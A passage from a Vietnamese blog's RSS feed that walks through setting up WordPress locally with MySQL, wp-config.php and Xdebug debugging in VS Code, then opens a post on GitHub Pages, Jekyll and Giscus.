4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;WordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Bài viết, trang, menu&lt;/li&gt;&#xA;&lt;li&gt;Người dùng, mật khẩu (hash)&lt;/li&gt;&#xA;&lt;li&gt;Cấu hình site&lt;/li&gt;&#xA;&lt;li&gt;Plugins, themes settings&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Mở MySQL với quyền root&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo mysql -u root&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Cấu hình MySQL&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;-- Tạo database wordpress &#xA;mysql&amp;gt; CREATE DATABASE wordpress;&#xA;Query OK, 1 row affected (0,00 sec)&#xA;&#xA;-- Tạo user riêng cho wordpress&#xA;mysql&amp;gt; CREATE USER wordpress@localhost IDENTIFIED BY &amp;#39;&amp;lt;your-password&amp;gt;&amp;#39;;&#xA;Query OK, 1 row affected (0,00 sec)&#xA;&#xA;-- Cấp quyền cho user WordPress&#xA;mysql&amp;gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost;&#xA;Query OK, 1 row affected (0,00 sec)&#xA;&#xA;-- Làm mới lại quyền&#xA;mysql&amp;gt; FLUSH PRIVILEGES;&#xA;Query OK, 1 row affected (0,00 sec)&#xA;&#xA;-- Thoát&#xA;mysql&amp;gt; quit&#xA;Bye&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Khởi động lại dịch vụ&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo service mysql start&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-wordpress-to-connect-to-the-database&#34;&gt;&lt;span&gt;Configure WordPress to connect to the database&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-wordpress-to-connect-to-the-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Copy file cấu hình mẫu&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;WordPress khi tải về có sẵn file wp-config-sample.php&lt;/li&gt;&#xA;&lt;li&gt;Bạn copy nó thành wp-config.php để làm file cấu hình chính cho site&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Chỉnh sửa thông tin database&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo -u www-data sed -i &amp;#39;s/database_name_here/wordpress/&amp;#39; /srv/www/wordpress/wp-config.php&#xA;sudo -u www-data sed -i &amp;#39;s/username_here/wordpress/&amp;#39; /srv/www/wordpress/wp-config.php&#xA;sudo -u www-data sed -i &amp;#39;s/password_here/&amp;lt;your-password&amp;gt;/&amp;#39; /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Đây là 3 dòng thay thế text trong file &lt;code&gt;wp-config.php&lt;/code&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;database_name_here&lt;/code&gt; =&amp;gt; &lt;code&gt;wordpress&lt;/code&gt; (tên DB đã tạo ở bước trước)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;username_here&lt;/code&gt; =&amp;gt; &lt;code&gt;wordpress&lt;/code&gt; (user MySQL đã tạo)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;password_here&lt;/code&gt; =&amp;gt; &lt;code&gt;&amp;lt;your-password&amp;gt;&lt;/code&gt; (password đã set)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Khi Apache chạy WordPress, nó sẽ đọc file này để biết dùng user nào + DB nào để kết nối MySQL&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Thêm Secret Keys và Salts&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo -u www-data nano /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Đây là chuỗi bí mật mà WordPress dùng để:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mã hóa session cookies&lt;/li&gt;&#xA;&lt;li&gt;Sinh ra token (nonce) chống CSRF&lt;/li&gt;&#xA;&lt;li&gt;Ngăn chặn tấn công kiểu “known secret” (ví dụ kẻ tấn công đoán được secret mặc định để giả mạo login)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;define( &amp;#39;AUTH_KEY&amp;#39;,         &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;SECURE_AUTH_KEY&amp;#39;,  &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;LOGGED_IN_KEY&amp;#39;,    &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;NONCE_KEY&amp;#39;,        &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;AUTH_SALT&amp;#39;,        &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;SECURE_AUTH_SALT&amp;#39;, &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;LOGGED_IN_SALT&amp;#39;,   &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;NONCE_SALT&amp;#39;,       &amp;#39;put your unique phrase here&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thay đổi nó bằng các chuỗi random sau: &lt;a href=&#34;https://api.wordpress.org/secret-key/1.1/salt/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://api.wordpress.org/secret-key/1.1/salt/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-wordpress&#34;&gt;&lt;span&gt;Configure WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Truy cập &lt;a href=&#34;http://localhost&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost&lt;/a&gt;, đặt &lt;strong&gt;site title&lt;/strong&gt;, &lt;strong&gt;username&lt;/strong&gt;, &lt;strong&gt;password&lt;/strong&gt;, &lt;strong&gt;email&lt;/strong&gt; cho user &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://ubuntucommunity.s3.us-east-2.amazonaws.com/original/2X/e/ebe4d6066e0c32f14beca85ffd53e5915a4ab278.png&#39; alt=&#34;Configure WordPress&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;setup-debug-on-vscode&#34;&gt;&lt;span&gt;Setup Debug on VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-debug-on-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Để hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;add-php-debug-extension-on-vs-code&#34;&gt;&lt;span&gt;Add PHP Debug extension on VS Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#add-php-debug-extension-on-vs-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Vào &lt;strong&gt;Extensions (Ctrl+Shift+X)&lt;/strong&gt; =&amp;gt; tìm &lt;strong&gt;PHP Debug (by Felix Becker)&lt;/strong&gt; =&amp;gt; &lt;strong&gt;Install&lt;/strong&gt;.&#xA;Extension này kết nối với &lt;strong&gt;Xdebug&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-xdebug-on-ubuntu&#34;&gt;&lt;span&gt;Install Xdebug on Ubuntu&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-xdebug-on-ubuntu&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;sudo apt install php-xdebug -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kiểm tra cài chưa:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;php -v&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu có dòng &lt;code&gt;with Xdebug v3.x.x&lt;/code&gt; nghĩa là đã OK.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-xdebug&#34;&gt;&lt;span&gt;Configure Xdebug&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-xdebug&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;sudo nano /etc/php/&amp;lt;version&amp;gt;/apache2/php.ini&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thêm vào cuối file&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;zend_extension=xdebug.so&#xA;xdebug.mode=debug&#xA;xdebug.start_with_request=yes&#xA;xdebug.client_host=127.0.0.1&#xA;xdebug.client_port=9003&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Port mặc định mới của Xdebug v3 là &lt;strong&gt;9003&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Sau đó restart Apache:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo systemctl restart apache2&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-vscode-launchjson&#34;&gt;&lt;span&gt;Configure VSCode &lt;code&gt;launch.json&lt;/code&gt;&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-vscode-launchjson&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Mở thư mục chứa trang web wordpress bằng VSCode&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;code /srv/www/wordpress&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong &lt;strong&gt;VS Code&lt;/strong&gt; =&amp;gt; &lt;strong&gt;Run and Debug (Ctrl+Shift+D)&lt;/strong&gt; =&amp;gt; tạo file &lt;code&gt;launch.json&lt;/code&gt; với nội dung:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;version&amp;#34;: &amp;#34;0.2.0&amp;#34;,&#xA;  &amp;#34;configurations&amp;#34;: [&#xA;    {&#xA;      &amp;#34;name&amp;#34;: &amp;#34;Listen for Xdebug&amp;#34;,&#xA;      &amp;#34;type&amp;#34;: &amp;#34;php&amp;#34;,&#xA;      &amp;#34;request&amp;#34;: &amp;#34;launch&amp;#34;,&#xA;      &amp;#34;port&amp;#34;: 9003,&#xA;      &amp;#34;pathMappings&amp;#34;: {&#xA;        &amp;#34;/srv/www/wordpress&amp;#34;: &amp;#34;${workspaceFolder}&amp;#34;&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;pathMappings&lt;/code&gt;: ánh xạ thư mục trong &lt;strong&gt;container/server&lt;/strong&gt; (&lt;code&gt;/srv/www/wordpress&lt;/code&gt;) về thư mục &lt;strong&gt;local&lt;/strong&gt; của trong VS Code.&lt;/p&gt;&#xA;&lt;p&gt;Như vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;extend&#34;&gt;&lt;span&gt;Extend&lt;/span&gt;&#xA;  &lt;a href=&#34;#extend&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;required-version&#34;&gt;&lt;span&gt;Required Version&lt;/span&gt;&#xA;  &lt;a href=&#34;#required-version&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Mỗi phiên bản WordPress thường đi kèm 1 phiên bản PHP thích hợp. Nên kiểm tra tính tương thích này để quá trình setup không bị lỗi.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;wordpress-auto-update&#34;&gt;&lt;span&gt;WordPress Auto Update&lt;/span&gt;&#xA;  &lt;a href=&#34;#wordpress-auto-update&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Từ WordPress &lt;strong&gt;3.7 trở đi&lt;/strong&gt; (2013), WordPress có cơ chế tự động cập nhật (&lt;strong&gt;automatic background updates&lt;/strong&gt;) cho:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Bản vá bảo mật (security release).&lt;/li&gt;&#xA;&lt;li&gt;Bản bảo trì (maintenance release).&lt;/li&gt;&#xA;&lt;li&gt;Không tự động update major version (trừ khi bật rõ ràng).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Hệ thống kiểm tra với server &lt;strong&gt;api.wordpress.org&lt;/strong&gt; để xem có bản vá nào mới sẽ tự động nâng cấp background lên. Việc này diễn ra rất nhanh sau khi setup, nên bạn thấy code đổi khác so với source gốc.&lt;/p&gt;&#xA;&lt;p&gt;Quá trình setup diễn ra khi truy cập &lt;strong&gt;/wp-admin/install.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Để vô hiệu hóa cơ chế cập nhật tự động này, thêm dòng sau vào &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;define( &amp;#39;WP_AUTO_UPDATE_CORE&amp;#39;, false );&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Github Pages with Jekyll themes and Giscus</title>
      <link>http://localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/</link>
      <pubDate>Tue, 19 Aug 2025 01:10:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/</guid>
      <category domain="http://localhost:1313/vi/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Khi bắt đầu tạo blog cá nhân, có ba công cụ bạn cần biết: GitHub Pages, Jekyll và Giscus.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Github Pages&lt;/strong&gt;: Dịch vụ miễn phí từ GitHub, cho phép bạn triển khai website tĩnh trực tiếp từ repository. Chỉ cần push code lên GitHub, blog của bạn sẽ tự động xuất hiện trên Internet mà không cần server riêng.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Jekyll&lt;/strong&gt;: Một static site generator tích hợp sẵn với GitHub Pages. Jekyll giúp bạn dễ dàng tạo blog từ các file Markdown, tổ chức nội dung bằng template và theme sẵn có.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Giscus&lt;/strong&gt;: Một hệ thống bình luận hiện đại dựa trên GitHub Discussions. Thay vì phải dùng dịch vụ ngoài như Disqus, bạn có thể tận dụng GitHub để quản lý comment, vừa gọn nhẹ vừa thân thiện với developer.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 